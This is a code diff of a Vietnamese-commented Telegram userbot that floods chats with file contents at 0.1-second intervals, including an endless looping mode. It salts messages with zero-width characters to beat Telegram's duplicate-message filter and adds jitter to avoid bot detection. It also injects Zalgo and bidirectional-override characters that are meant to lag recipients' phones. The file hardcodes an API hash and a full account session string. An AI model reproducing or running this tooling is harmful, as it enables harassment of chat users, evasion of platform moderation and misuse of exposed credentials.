@@ -17,62 +17,69 @@ from telethon.errors import (
 API_ID = int(os.environ.get("API_ID", 32906102))
 API_HASH = os.environ.get("API_HASH", "9fc3add5b6bf34cc5335a85388f34a0f")
 
-# Chuỗi Session tài khoản Userbot
 DEFAULT_SESSION = "1BVtsOIIBuxPBTJcjHmwH5MpU1DO068XwGFkdO2mxIdbqKtMt_-u3_jQkzaUUDCLtD_-HOZ2NTkXI0cDQistaYUm13b3uR-K_vRgXK168mNbiYd7selpS9nUa4NGQSfZSVu_LuhFmYmJK1kmcXJUD41QdOjuV4Otw-_-CZNk_hL-WiDIe4kX4_7hPdPuis1gm4ysRUsVokf0lBwlhXIwVEggOUTcQ8WAFzzQhDZFxZ6Xqqc74837vt05JS9PnLIRDG-dliqgNC4JRXioFTap8rczjaMYTKmcIk47Rb9M59vzjTCc1CwwqhE5tix0HbBElSdY_R7OFC2jMbCwykCnI__U7OsmUhNs="
 SESSION_STRING = os.environ.get("SESSION_STRING", "").strip() or DEFAULT_SESSION
 
 PORT = int(os.environ.get("PORT", 8080))
-PREFIX = "."  # Tiền tố lệnh
+PREFIX = "."
 
-# Danh sách ID được phép điều khiển Userbot (Chính chủ + Admin)
 SUPER_ADMINS = [6094686933]
 ALLOWED_USERS = set(SUPER_ADMINS)
 
-# Cấu hình Tường Lửa Siêu Cấp
+# ==================== TƯỜNG LỬA GHOST-SHIELD V7 (TURBO 0.1S) ====================
 SYSTEM_CONFIG = {
-    "delay": 0.5,          # Vận tốc siêu tốc 0.5s mặc định
-    "use_icons": True,     # Bật icon chọc tức cực đỉnh
-    "batch_rest": 12,      # Cứ sau 12 tin sẽ xả nhiệt
-    "rest_time": 4.5,      # Thời gian nghỉ xả nhiệt (giây)
-    "typing_sim": True     # Giả lập gõ phím
+    "delay": 0.1,          # Tốc độ xả cực hạn 0.1s
+    "batch_rest": 15,      # Cứ sau 15 tin thì hạ nhiệt
+    "rest_time": 0.5,      # Thời gian nghỉ chỉ 0.5s
+    "use_icons": True,
+    "lag_mode": False      # Tự động hóa chế độ lag máy cực nặng
 }
 
 RUNNING_TASKS = {}
 MY_ID = None
 
-# Kho Icon Meme Toxic & Cyber Warlord
-MEME_ICONS = ["🤡", "🫵", "💀", "🤫", "🧏‍♂️", "💩", "🐸", "😹", "🤪", "👌", "👻", "😈", "🦴", "🚮", "🥱", "🖕"]
+# Kho Icon chọc tức độc dị kết hợp Cyber Warlord
+MEME_ICONS = ["🤡", "🫵", "💀", "🤫", "🧏‍♂️", "💩", "🐸", "😹", "🤪", "👌", "👻", "😈", "🦴", "🚮", "🥱", "🖕", "🧠", "🤏"]
 CYBER_ICONS = ["亗", "𖤍", "🜲", "𒆜", "☬", "⚡", "𒀱", "𓊈☠︎𓊉", "☣", "𖤐", "⚜", "𖣘", "☯", "☸"]
 BATQUAI_SYMBOLS = ["☰", "☱", "☲", "☳", "☴", "☵", "☶", "☷"]
 
-# Ký tự vô hình & Đổi hướng chống quét trùng lặp SHA-256
+# Zero-Width Entropy Injection: Phá vỡ triệt để thuật toán quét trùng Hash SHA-256 của Telegram
 INVISIBLE_CHARS = ["\u200b", "\u200c", "\u200d", "\ufeff", "\u2060", "\u200e", "\u200f"]
 
-# Bảng dấu Zalgo Unicode Combining siêu nặng bắt điện thoại render lag
+# Ký tự điều hướng Bi-directional (Bắt GPU/CPU của điện thoại đối phương đảo chiều render liên tục)
+BIDI_OVERRIDES = ["\u202e", "\u202d", "\u202a", "\u202b", "\u202c", "\u2066", "\u2067", "\u2068", "\u2069"]
+
+# Tầng dấu Zalgo cực dày gây giật khung hình ứng dụng
 ZALGO_UP = [chr(i) for i in range(0x0300, 0x0315)]
 ZALGO_DOWN = [chr(i) for i in range(0x0316, 0x0330)]
 ZALGO_MID = [chr(i) for i in range(0x0334, 0x0339)]
 
-def make_zalgo(text: str, intensity: int = 4) -> str:
-    """Bơm ký tự ma quái Zalgo vào từng chữ cái gây quá tải render máy đối phương"""
-    res = []
-    for char in text:
-        res.append(char)
-        if char.isalnum():
+def build_hardware_lag_payload(text: str, intensity: int = 5) -> str:
+    """Tạo payload Zalgo kết hợp Bidi Overrides gây nghẽn tiến trình render UI trên điện thoại"""
+    builder = []
+    for ch in text:
+        builder.append(ch)
+        if ch.isalnum() or ch == " ":
+            # Bơm tầng tầng lớp lớp combining marks
             for _ in range(intensity):
-                res.append(random.choice(ZALGO_UP))
-                res.append(random.choice(ZALGO_DOWN))
-                res.append(random.choice(ZALGO_MID))
-    return "".join(res)
+                builder.append(random.choice(ZALGO_UP))
+                builder.append(random.choice(ZALGO_DOWN))
+                builder.append(random.choice(ZALGO_MID))
+            # Chèn ký tự đổi hướng rendering ngẫu nhiên
+            builder.append(random.choice(BIDI_OVERRIDES))
+    return "".join(builder)
 
-def generate_stealth_text(text: str) -> str:
-    """Tạo mã Hash duy nhất từng tin nhắn bằng Zero-Width Entropy Injection"""
+def generate_stealth_text(text: str, apply_lag: bool = False) -> str:
+    """Tạo chuỗi Hash duy nhất từng đòn đánh để bypass hệ thống kiểm duyệt tin lặp"""
     words = text.split(" ")
-    salted = []
+    salted_words = []
     for w in words:
-        salt = "".join(random.choices(INVISIBLE_CHARS, k=random.randint(1, 4)))
-        salted.append(f"{w}{salt}")
-    core_text = " ".join(salted)
+        salt = "".join(random.choices(INVISIBLE_CHARS, k=random.randint(2, 6)))
+        salted_words.append(f"{w}{salt}")
+    core_text = " ".join(salted_words)
+
+    if apply_lag:
+        core_text = build_hardware_lag_payload(core_text, intensity=4)
 
     if SYSTEM_CONFIG["use_icons"]:
         ic_left = f"{random.choice(CYBER_ICONS)} {random.choice(MEME_ICONS)}"
@@ -81,7 +88,7 @@ def generate_stealth_text(text: str) -> str:
     return core_text
 
 def parse_and_sort_file(content: str) -> list:
-    """Tự động phân loại số thứ tự đầu dòng, sắp xếp chuẩn và loại bỏ số"""
+    """Bóc tách hoàn toàn bằng file: Tự nhận biết số thứ tự đầu dòng, sắp xếp chuẩn và loại bỏ số"""
     lines = [ln.strip() for ln in content.splitlines() if ln.strip()]
     parsed = []
     for idx, line in enumerate(lines):
@@ -96,7 +103,7 @@ def parse_and_sort_file(content: str) -> list:
     return [item[1] for item in parsed]
 
 async def safe_respond(event, text):
-    """Tự động nhận diện: Nếu là tin của bot thì sửa, nếu nhóm cấm sửa hoặc do Admin gọi thì Reply"""
+    """Phản hồi an toàn: Thử sửa tin nhắn nếu có thể, tự động chuyển reply nếu bị cấm edit"""
     if event.out:
         try:
             return await event.edit(text)
@@ -107,10 +114,10 @@ async def safe_respond(event, text):
     except Exception as e:
         print(f"[!] Lỗi safe_respond: {e}")
 
-# ==================== WEB SERVER GIỮ RENDER 24/7 ====================
+# ==================== WEB SERVER GIỮ RENDER ONLINE 24/7 ====================
 async def handle_health(request):
     return web.Response(
-        text="ANH KHOI PRO MAX BAT QUAI TRAN V6\nSPEED: 0.5S TURBO ACTIVE\nFIREWALL: ULTRA STEALTH ONLINE",
+        text="ANH KHOI PRO MAX HYPER-DRIVE 2026\nTURBO SPEED: 0.1S | REST: 0.5S\nFIREWALL: GHOST-SHIELD V7 ACTIVE",
         content_type="text/plain; charset=utf-8",
         status=200
     )
@@ -123,28 +130,29 @@ async def start_web_server():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    print(f"[*] Web Server đã kích hoạt thành công tại Port {PORT}")
+    print(f"[*] Web Server đã kích hoạt thành công trên Port {PORT}")
 
 # ==================== KHỞI TẠO TELETHON CLIENT ====================
 client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
 
-# ==================== BỘ ĐIỀU PHỐI TIN NHẮN TẬP TRUNG ====================
+# ==================== BỘ ĐIỀU PHỐI ĐỘC QUYỀN BẰNG FILE ====================
 @client.on(events.NewMessage)
-async def central_handler(event):
+async def central_file_handler(event):
     global MY_ID, ALLOWED_USERS
 
     try:
         sender_id = event.sender_id
 
-        # 1. Tự động tải và lưu file .txt khi bạn gửi vào bất kỳ chat nào
+        # 1. TỰ ĐỘNG LƯU FILE KHI GỬI TỆP TIN .TXT (KHÔNG CẦN NHẬP CHỮ)
         if (event.out or sender_id in ALLOWED_USERS) and event.message.file:
             fname = getattr(event.message.file, "name", None)
             if fname and str(fname).lower().endswith(".txt"):
                 save_path = await event.message.download_media(file=fname)
                 print(f"[*] [TỰ ĐỘNG LƯU FILE]: {save_path}")
+                await safe_respond(event, f"📥 **ĐÃ LƯU FILE SERVER:** `{os.path.basename(save_path)}`\n⚡ Sẵn sàng xả 0.1s: `{PREFIX}xaf {os.path.basename(save_path)}`")
                 return
 
-        # 2. Kiểm tra quyền thực thi (Chính chủ bot HOẶC Admin cho phép)
+        # 2. KIỂM TRA QUYỀN ĐIỀU KHIỂN
         is_authorized = event.out or (sender_id in ALLOWED_USERS)
         if not is_authorized:
             return
@@ -153,22 +161,21 @@ async def central_handler(event):
         if not raw_text.startswith(PREFIX):
             return
 
-        # Tách lệnh và đối số
         parts = raw_text.split()
         cmd = parts[0].lower()
         args = parts[1:]
         chat_id = event.chat_id
 
-        print(f"[>] [LỆNH]: {cmd} | Từ Sender: {sender_id} | Chat: {chat_id}")
+        print(f"[>] [KÍCH HOẠT LỆNH]: {cmd} | Chat: {chat_id}")
 
         # --- LỆNH: .ping ---
         if cmd == f"{PREFIX}ping":
             await safe_respond(
                 event,
-                f"⚡ **BÁT QUÁI TRẬN ANH KHÔI – V6 ONLINE!** 🤡🫵\n"
-                f"🛡️ **Firewall Anti-Ban:** `GHOST SHIELD V6 ULTRA`\n"
-                f"⏱️ **Tốc độ xung trận:** `{SYSTEM_CONFIG['delay']}s/đòn`\n"
-                f"🎭 **Icon Chọc Tức:** `{'BẬT 🔥' if SYSTEM_CONFIG['use_icons'] else 'TẮT ⚪'}`\n"
+                f"⚡ **ANH KHÔI HYPER-DRIVE TURBO 0.1S ONLINE!** 🤡🫵\n"
+                f"🛡️ **Firewall Anti-Ban:** `GHOST SHIELD V7 ULTRA`\n"
+                f"⏱️ **Vận tốc:** `{SYSTEM_CONFIG['delay']}s/đòn` | **Nghỉ:** `{SYSTEM_CONFIG['rest_time']}s`\n"
+                f"🌀 **Chế độ Lag Máy:** `{'BẬT (ZALGO+BIDI)' if SYSTEM_CONFIG['lag_mode'] else 'TẮT'}`\n"
                 f"🌐 **Server Render:** `Live 24/7 Hoàn Hảo`"
             )
             return
@@ -176,122 +183,38 @@ async def central_handler(event):
         # --- LỆNH: .help / .lenh ---
         if cmd in [f"{PREFIX}help", f"{PREFIX}lenh"]:
             menu = (
-                "👑 **BẢNG ĐIỀU KHIỂN BÁT QUÁI TRẬN V6 - ANH KHÔI** 🤪👌\n"
+                "👑 **HỆ THỐNG ĐIỀU KHIỂN FILE & TURBO 0.1S - ANH KHÔI** 🤪👌\n"
                 "━━━━━━━━━━━━━━━━━━━━━\n"
-                "**📁 QUẢN LÝ FILE:**\n"
-                f"• Gửi file `.txt` vào chat -> Server tự tải lưu ngay\n"
-                f"• `{PREFIX}luufile [tên]` (Reply file) : Tải và đổi tên\n"
-                f"• `{PREFIX}dsfile` : Xem danh sách file trên máy chủ\n"
+                "**📁 QUẢN LÝ BẰNG FILE:**\n"
+                f"• Gửi file `.txt` vào bất kỳ chat nào -> Tự nạp vào server\n"
+                f"• `{PREFIX}dsfile` : Xem tất cả các file đang có trên server\n"
                 f"• `{PREFIX}xemfile <tên>` : Đọc trước nội dung file\n"
                 f"• `{PREFIX}xoafile <tên>` : Xóa file khỏi máy chủ\n\n"
-                "**🔥 HỎA LỰC 0.5S & TREO NGÔN BÁT QUÁI:**\n"
-                f"• `{PREFIX}xaf <tên_file>` : Xả đòn 0.5s theo thứ tự file\n"
-                f"• `{PREFIX}treongon <tên_file>` : Treo ngôn vô tận xoay vòng 24/7\n"
-                f"• `{PREFIX}xalap <nội dung> [số]` : Xả liên thanh 1 câu cực nhanh\n"
-                f"• `{PREFIX}dung` : Đình chỉ mọi luồng xả / treo lập tức\n\n"
-                "**🌀 MA QUÁI & HIỆU ỨNG LAG MÁY:**\n"
-                f"• `{PREFIX}batquai <nội dung>` : Trận pháp xoay vần 8 quẻ Kinh Dịch\n"
-                f"• `{PREFIX}glitch <nội dung>` : Bơm Zalgo ma quái giật khung hình\n"
-                f"• `{PREFIX}type <văn bản>` : Gõ phím ma quái từng ký tự\n\n"
-                "**🛡️ ANTI-BAN & ĐIỀU TỐC:**\n"
-                f"• `{PREFIX}delay <giây>` : Chỉnh giây (Xuống tới `0.3s - 0.5s`)\n"
+                "**🔥 CHIẾN DỊCH HỎA LỰC 0.1S (THEO FILE):**\n"
+                f"• `{PREFIX}xaf <tên_file>` : Xả 1 lượt tốc độ 0.1s (Tự lọc số dòng)\n"
+                f"• `{PREFIX}treongon <tên_file>` : Treo xoay vòng vô tận 24/7 từ file\n"
+                f"• `{PREFIX}lagfile <tên_file>` : Xả đòn cấy Zalgo + Bát Quái gây giật lag máy\n"
+                f"• `{PREFIX}batquaifile <tên_file>` : Trận pháp xoay vần 8 quẻ từ nội dung file\n"
+                f"• `{PREFIX}dung` : Đình chỉ lập tức mọi luồng xả / treo\n\n"
+                "**🛡️ ANTI-BAN & ĐIỀU KHIỂN TỐC ĐỘ:**\n"
+                f"• `{PREFIX}delay <giây>` : Cài đặt độ trễ (Hạ xuống tới `0.1s`)\n"
+                f"• `{PREFIX}nghi <giây>` : Cài đặt thời gian xả nhiệt (Rút xuống `0.5s`)\n"
+                f"• `{PREFIX}lag` : Bật/Tắt chế độ tự cấy Zalgo lag máy vào mọi câu\n"
                 f"• `{PREFIX}icon` : Bật/Tắt dàn icon chọc tức 🤡🫵💀\n\n"
-                "**🧹 DỌN DẸP TIN NHẮN:**\n"
+                "**🧹 THANH TRỪNG TIN NHẮN:**\n"
                 f"• `{PREFIX}del [số]` : Xóa tin nhắn của chính mình\n"
                 f"• `{PREFIX}xoahet` (Reply tin) : Quét sạch tin từ điểm reply"
             )
             await safe_respond(event, menu)
             return
 
-        # --- LỆNH: .delay ---
-        if cmd == f"{PREFIX}delay":
-            if not args:
-                return await safe_respond(event, f"⏱️ Delay hiện tại: `{SYSTEM_CONFIG['delay']}s/đòn`")
-            try:
-                val = float(args[0])
-                if val < 0.2:
-                    return await safe_respond(event, "⚠️ **Firewall chặn:** Giới hạn an toàn tối thiểu là `0.2s` để tránh ban số!")
-                SYSTEM_CONFIG["delay"] = val
-                await safe_respond(event, f"🛡️ Đã thiết lập vận tốc siêu tốc: `{val}s/đòn` ⚡")
-            except Exception:
-                await safe_respond(event, "❌ Số giây không hợp lệ!")
-            return
-
-        # --- LỆNH: .icon ---
-        if cmd == f"{PREFIX}icon":
-            SYSTEM_CONFIG["use_icons"] = not SYSTEM_CONFIG["use_icons"]
-            st = "BẬT 🤡🫵💀" if SYSTEM_CONFIG["use_icons"] else "TẮT ⚪"
-            await safe_respond(event, f"𖤍 Dàn Icon chọc tức: **{st}**")
-            return
-
-        # --- LỆNH: .batquai (TRẬN PHÁP 8 QUẺ KINH DỊCH) ---
-        if cmd == f"{PREFIX}batquai":
-            if not args:
-                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}batquai <nội dung>`")
-            content = " ".join(args)
-            for i in range(8):
-                q = BATQUAI_SYMBOLS[i % len(BATQUAI_SYMBOLS)]
-                glitch_mark = random.choice(MEME_ICONS)
-                display = f"☯ 亗 [ BÁT QUÁI TRẬN: {q} ] 亗 ☯\n👉 {content} 👈\n{glitch_mark} {BATQUAI_SYMBOLS[(i+2)%8]} ANH KHÔI ĐỘC TÔN {BATQUAI_SYMBOLS[(i+4)%8]} {glitch_mark}"
-                try:
-                    await event.edit(display)
-                    await asyncio.sleep(0.12)
-                except Exception:
-                    pass
-            return
-
-        # --- LỆNH: .glitch / .lagma (BƠM ZALGO MA QUÁI) ---
-        if cmd in [f"{PREFIX}glitch", f"{PREFIX}lagma"]:
-            if not args:
-                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}glitch <nội dung>`")
-            raw_input = " ".join(args)
-            heavy_zalgo = make_zalgo(raw_input, intensity=4)
-            stealth_payload = generate_stealth_text(heavy_zalgo)
-            await safe_respond(event, f"☠︎ 𖤍 {stealth_payload} 𖤍 ☠︎")
-            return
-
-        # --- LỆNH: .type ---
-        if cmd == f"{PREFIX}type":
-            if not args:
-                return
-            text_to_type = generate_stealth_text(" ".join(args))
-            typing_symbol = "▌"
-            current_text = ""
-            for char in text_to_type:
-                current_text += char
-                try:
-                    await event.edit(current_text + typing_symbol)
-                    await asyncio.sleep(random.uniform(0.03, 0.06))
-                except Exception:
-                    pass
-            try:
-                await event.edit(current_text)
-            except Exception:
-                pass
-            return
-
-        # --- LỆNH: .dsfile, .luufile, .xemfile, .xoafile ---
+        # --- LỆNH: .dsfile, .xemfile, .xoafile ---
         if cmd == f"{PREFIX}dsfile":
-            files = [f for f in os.listdir(".") if os.path.isfile(f)]
+            files = [f for f in os.listdir(".") if os.path.isfile(f) and f.endswith(".txt")]
             if not files:
-                return await safe_respond(event, "📁 Server chưa có file nào.")
+                return await safe_respond(event, "📁 Server chưa có file `.txt` nào. Hãy gửi file `.txt` vào chat để nạp!")
             ds = "\n".join([f"• `{f}` ({os.path.getsize(f)} bytes)" for f in files[:35]])
-            await safe_respond(event, f"📁 **DANH SÁCH FILE TRÊN SERVER:**\n{ds}")
-            return
-
-        if cmd == f"{PREFIX}luufile":
-            reply = await event.get_reply_message()
-            target_msg = reply if (reply and reply.media) else event.message
-            if not target_msg.media:
-                return await safe_respond(event, "❌ Hãy gửi kèm file hoặc Reply vào tin nhắn chứa file!")
-            custom_name = args[0] if args else ""
-            await safe_respond(event, "⏳ Đang tải file về máy chủ...")
-            saved_path = await target_msg.download_media(file=custom_name or "")
-            if saved_path:
-                fname = os.path.basename(saved_path)
-                await safe_respond(event, f"✅ **ĐÃ LƯU FILE!**\n📁 Tên: `{fname}`\n👉 Bắt đầu xả: `{PREFIX}xaf {fname}`")
-            else:
-                await safe_respond(event, "❌ Lưu file thất bại!")
+            await safe_respond(event, f"📁 **DANH SÁCH FILE VĂN BẢN TRÊN SERVER:**\n{ds}")
             return
 
         if cmd == f"{PREFIX}xemfile":
@@ -313,32 +236,72 @@ async def central_handler(event):
                 return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}xoafile <tên_file>`")
             fname = args[0]
             if fname in ["main.py", "requirements.txt"]:
-                return await safe_respond(event, "⚠️ Không được xóa file gốc hệ thống!")
+                return await safe_respond(event, "⚠️ Không được xóa file hệ thống!")
             if not os.path.exists(fname):
                 return await safe_respond(event, f"❌ File `{fname}` không tồn tại.")
             try:
                 os.remove(fname)
                 await safe_respond(event, f"🗑️ Đã xóa file `{fname}` thành công!")
             except Exception as e:
-                await safe_respond(event, f"❌ Lỗi: {e}")
+                await safe_respond(event, f"❌ Lỗi xóa file: {e}")
+            return
+
+        # --- LỆNH: .delay & .nghi ---
+        if cmd == f"{PREFIX}delay":
+            if not args:
+                return await safe_respond(event, f"⏱️ Delay hiện tại: `{SYSTEM_CONFIG['delay']}s/đòn`")
+            try:
+                val = float(args[0])
+                if val < 0.05:
+                    return await safe_respond(event, "⚠️ **Cảnh báo Firewall:** Mức tối thiểu là `0.1s` để tránh bị Telegram Drop Socket!")
+                SYSTEM_CONFIG["delay"] = val
+                await safe_respond(event, f"🛡️ Đã thiết lập vận tốc siêu tốc: `{val}s/đòn` ⚡")
+            except Exception:
+                await safe_respond(event, "❌ Số giây không hợp lệ!")
+            return
+
+        if cmd == f"{PREFIX}nghi":
+            if not args:
+                return await safe_respond(event, f"⏱️ Thời gian nghỉ xả nhiệt hiện tại: `{SYSTEM_CONFIG['rest_time']}s`")
+            try:
+                val = float(args[0])
+                SYSTEM_CONFIG["rest_time"] = max(0.2, val)
+                await safe_respond(event, f"🛡️ Đã cài đặt thời gian nghỉ xả nhiệt: `{SYSTEM_CONFIG['rest_time']}s`")
+            except Exception:
+                await safe_respond(event, "❌ Số giây không hợp lệ!")
+            return
+
+        # --- LỆNH: .lag (BẬT/TẮT TỰ ĐỘNG CHÈN PAYLOAD GÂY LAG MÁY) ---
+        if cmd == f"{PREFIX}lag":
+            SYSTEM_CONFIG["lag_mode"] = not SYSTEM_CONFIG["lag_mode"]
+            st = "BẬT CỰC NẶNG (ZALGO + BIDI OVERLOAD) ☠️" if SYSTEM_CONFIG["lag_mode"] else "TẮT ⚪"
+            await safe_respond(event, f"🌀 Chế độ cấy mã lag giật khung hình: **{st}**")
+            return
+
+        # --- LỆNH: .icon ---
+        if cmd == f"{PREFIX}icon":
+            SYSTEM_CONFIG["use_icons"] = not SYSTEM_CONFIG["use_icons"]
+            st = "BẬT 🤡🫵💀" if SYSTEM_CONFIG["use_icons"] else "TẮT ⚪"
+            await safe_respond(event, f"𖤍 Dàn Icon chọc tức: **{st}**")
             return
 
         # --- LỆNH: .dung / .stop ---
         if cmd in [f"{PREFIX}dung", f"{PREFIX}stop"]:
             if RUNNING_TASKS.get(chat_id):
                 RUNNING_TASKS[chat_id] = False
-                await safe_respond(event, "🛑 **ĐÃ THU HỒI TRẬN PHÁP – TOÀN BỘ LUỒNG ĐÃ DỪNG!**")
+                await safe_respond(event, "🛑 **ĐÃ THU HỒI TRẬN PHÁP – TOÀN BỘ LUỒNG XẢ ĐÃ NGẮT!**")
             else:
-                await safe_respond(event, "⚠️ Không có tác vụ nào đang chạy tại đoạn chat này.")
+                await safe_respond(event, "⚠️ Không có tác vụ xả nào đang chạy tại đoạn chat này.")
             return
 
-        # --- LỆNH: .xaf (TỐC ĐỘ 0.5S SIÊU TỐC) ---
+        # --- LỆNH: .xaf (XẢ FILE TỐC ĐỘ 0.1S) ---
         if cmd == f"{PREFIX}xaf":
             if not args:
-                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}xaf <tên_file>`")
+                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}xaf <tên_file>` (Dùng `{PREFIX}dsfile` để xem danh sách)")
             fname = args[0]
             if not os.path.exists(fname):
-                return await safe_respond(event, f"❌ Không tìm thấy file `{fname}`! Hãy gửi file vào chat để bot lưu.")
+                return await safe_respond(event, f"❌ Không tìm thấy file `{fname}`! Hãy gửi file `.txt` vào chat để bot nạp.")
+
             try:
                 with open(fname, "r", encoding="utf-8", errors="ignore") as f:
                     raw = f.read()
@@ -360,43 +323,44 @@ async def central_handler(event):
             for line in lines:
                 if not RUNNING_TASKS.get(chat_id):
                     break
-                final_msg = generate_stealth_text(line)
+
+                final_msg = generate_stealth_text(line, apply_lag=SYSTEM_CONFIG["lag_mode"])
+
                 sent = False
                 while not sent and RUNNING_TASKS.get(chat_id):
                     try:
-                        if SYSTEM_CONFIG["typing_sim"]:
-                            async with client.action(chat_id, "typing"):
-                                await asyncio.sleep(0.06)
                         await client.send_message(chat_id, final_msg)
                         sent = True
                         count += 1
                     except FloodWaitError as e:
-                        print(f"[FIREWALL] Gặp FloodWait! Ngủ {e.seconds}s bảo toàn tài khoản...")
-                        await asyncio.sleep(e.seconds + 2)
+                        print(f"[FIREWALL] Gặp FloodWait! Tự ngủ {e.seconds}s để bảo toàn tài khoản...")
+                        await asyncio.sleep(e.seconds + 1)
                     except SlowModeWaitError as e:
-                        print(f"[FIREWALL] Nhóm bật SlowMode! Chờ {e.seconds}s...")
                         await asyncio.sleep(e.seconds + 1)
                     except Exception as e:
                         print(f"[LỖI GỬI]: {e}")
-                        await asyncio.sleep(0.5)
+                        await asyncio.sleep(0.2)
                         break
 
+                # Xả nhiệt cực ngắn 0.5s sau mỗi chu kỳ 15 tin
                 if count % SYSTEM_CONFIG["batch_rest"] == 0 and RUNNING_TASKS.get(chat_id):
                     await asyncio.sleep(SYSTEM_CONFIG["rest_time"])
 
-                jitter = random.uniform(0.04, 0.12)
+                # Delay 0.1s kết hợp Micro-Jitter chống quét mẫu bot
+                jitter = random.uniform(0.01, 0.04)
                 await asyncio.sleep(SYSTEM_CONFIG["delay"] + jitter)
 
             RUNNING_TASKS[chat_id] = False
             return
 
-        # --- LỆNH: .treongon (XOAY VÒNG 24/7) ---
+        # --- LỆNH: .treongon (XOAY VÒNG 24/7 TỪ FILE) ---
         if cmd == f"{PREFIX}treongon":
             if not args:
                 return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}treongon <tên_file>`")
             fname = args[0]
             if not os.path.exists(fname):
                 return await safe_respond(event, f"❌ File `{fname}` không tồn tại!")
+
             try:
                 with open(fname, "r", encoding="utf-8", errors="ignore") as f:
                     raw = f.read()
@@ -419,44 +383,50 @@ async def central_handler(event):
 
             while RUNNING_TASKS.get(chat_id):
                 current_line = lines[idx]
-                final_msg = generate_stealth_text(current_line)
+                final_msg = generate_stealth_text(current_line, apply_lag=SYSTEM_CONFIG["lag_mode"])
+
                 sent = False
                 while not sent and RUNNING_TASKS.get(chat_id):
                     try:
-                        if SYSTEM_CONFIG["typing_sim"]:
-                            async with client.action(chat_id, "typing"):
-                                await asyncio.sleep(0.06)
                         await client.send_message(chat_id, final_msg)
                         sent = True
                         count += 1
                     except FloodWaitError as e:
-                        await asyncio.sleep(e.seconds + 2)
+                        await asyncio.sleep(e.seconds + 1)
                     except SlowModeWaitError as e:
                         await asyncio.sleep(e.seconds + 1)
                     except Exception:
-                        await asyncio.sleep(0.8)
+                        await asyncio.sleep(0.4)
                         break
 
                 idx = (idx + 1) % total_lines
+
                 if count % SYSTEM_CONFIG["batch_rest"] == 0 and RUNNING_TASKS.get(chat_id):
                     await asyncio.sleep(SYSTEM_CONFIG["rest_time"])
 
-                jitter = random.uniform(0.05, 0.15)
+                jitter = random.uniform(0.01, 0.05)
                 await asyncio.sleep(SYSTEM_CONFIG["delay"] + jitter)
 
             RUNNING_TASKS[chat_id] = False
             return
 
-        # --- LỆNH: .xalap ---
-        if cmd == f"{PREFIX}xalap":
+        # --- LỆNH: .lagfile (CẤY SIÊU ZALGO VÀ BIDI OVERLOAD VÀO TỪNG DÒNG FILE) ---
+        if cmd == f"{PREFIX}lagfile":
             if not args:
-                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}xalap <nội dung> [số lần]`")
-            times = 20
-            if args[-1].isdigit():
-                times = int(args[-1])
-                content = " ".join(args[:-1])
-            else:
-                content = " ".join(args)
+                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}lagfile <tên_file>`")
+            fname = args[0]
+            if not os.path.exists(fname):
+                return await safe_respond(event, f"❌ Không tìm thấy file `{fname}`!")
+
+            try:
+                with open(fname, "r", encoding="utf-8", errors="ignore") as f:
+                    raw = f.read()
+            except Exception as e:
+                return await safe_respond(event, f"❌ Lỗi đọc file: {e}")
+
+            lines = parse_and_sort_file(raw)
+            if not lines:
+                return await safe_respond(event, "⚠️ File không có nội dung!")
 
             try:
                 await event.delete()
@@ -464,36 +434,98 @@ async def central_handler(event):
                 pass
 
             RUNNING_TASKS[chat_id] = True
-            for i in range(times):
+            count = 0
+
+            for line in lines:
                 if not RUNNING_TASKS.get(chat_id):
                     break
-                final_msg = generate_stealth_text(content)
+
+                # Tạo đòn đánh Zalgo cực hạn
+                lag_payload = generate_stealth_text(line, apply_lag=True)
+
                 sent = False
                 while not sent and RUNNING_TASKS.get(chat_id):
                     try:
-                        if SYSTEM_CONFIG["typing_sim"]:
-                            async with client.action(chat_id, "typing"):
-                                await asyncio.sleep(0.05)
-                        await client.send_message(chat_id, final_msg)
+                        await client.send_message(chat_id, lag_payload)
                         sent = True
+                        count += 1
                     except FloodWaitError as e:
-                        await asyncio.sleep(e.seconds + 2)
+                        await asyncio.sleep(e.seconds + 1)
                     except SlowModeWaitError as e:
                         await asyncio.sleep(e.seconds + 1)
                     except Exception:
-                        await asyncio.sleep(0.5)
+                        await asyncio.sleep(0.3)
                         break
 
-                if (i + 1) % SYSTEM_CONFIG["batch_rest"] == 0 and RUNNING_TASKS.get(chat_id):
+                if count % SYSTEM_CONFIG["batch_rest"] == 0 and RUNNING_TASKS.get(chat_id):
                     await asyncio.sleep(SYSTEM_CONFIG["rest_time"])
 
-                jitter = random.uniform(0.04, 0.12)
+                jitter = random.uniform(0.02, 0.06)
                 await asyncio.sleep(SYSTEM_CONFIG["delay"] + jitter)
 
             RUNNING_TASKS[chat_id] = False
             return
 
-        # --- LỆNH: .del ---
+        # --- LỆNH: .batquaifile (TRẬN PHÁP 8 QUẺ KINH DỊCH THEO FILE) ---
+        if cmd == f"{PREFIX}batquaifile":
+            if not args:
+                return await safe_respond(event, f"💡 Cú pháp: `{PREFIX}batquaifile <tên_file>`")
+            fname = args[0]
+            if not os.path.exists(fname):
+                return await safe_respond(event, f"❌ Không tìm thấy file `{fname}`!")
+
+            try:
+                with open(fname, "r", encoding="utf-8", errors="ignore") as f:
+                    raw = f.read()
+            except Exception as e:
+                return await safe_respond(event, f"❌ Lỗi đọc file: {e}")
+
+            lines = parse_and_sort_file(raw)
+            if not lines:
+                return await safe_respond(event, "⚠️ File rỗng!")
+
+            try:
+                await event.delete()
+            except Exception:
+                pass
+
+            RUNNING_TASKS[chat_id] = True
+            count = 0
+
+            for line in lines:
+                if not RUNNING_TASKS.get(chat_id):
+                    break
+
+                q = random.choice(BATQUAI_SYMBOLS)
+                meme = random.choice(MEME_ICONS)
+                cyber = random.choice(CYBER_ICONS)
+                transformed = f"☯ {cyber} [{q} BÁT QUÁI TRẬN {q}] {cyber} ☯\n👉 {line} 👈\n{meme} {random.choice(BATQUAI_SYMBOLS)} ANH KHÔI ĐỘC TÔN {random.choice(BATQUAI_SYMBOLS)} {meme}"
+                final_msg = generate_stealth_text(transformed, apply_lag=SYSTEM_CONFIG["lag_mode"])
+
+                sent = False
+                while not sent and RUNNING_TASKS.get(chat_id):
+                    try:
+                        await client.send_message(chat_id, final_msg)
